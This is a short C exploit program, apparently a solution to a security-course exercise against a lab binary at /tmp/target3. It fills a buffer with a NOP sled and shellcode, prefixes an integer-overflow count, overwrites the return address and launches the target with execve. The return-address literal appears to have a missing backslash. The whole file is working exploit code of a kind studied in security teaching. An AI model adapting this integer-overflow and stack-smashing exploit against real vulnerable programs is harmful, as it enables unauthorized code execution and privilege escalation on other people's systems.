#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[161*20];
  memset(buf, 0x90, 161*20);

  strncpy(buf, "2147483889,", 11);
  strncpy(buf+(155*20), shellcode, 45);
  strncpy(buf+(160*20)+15, "x40\xdc\xff\xbf", 4);

  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
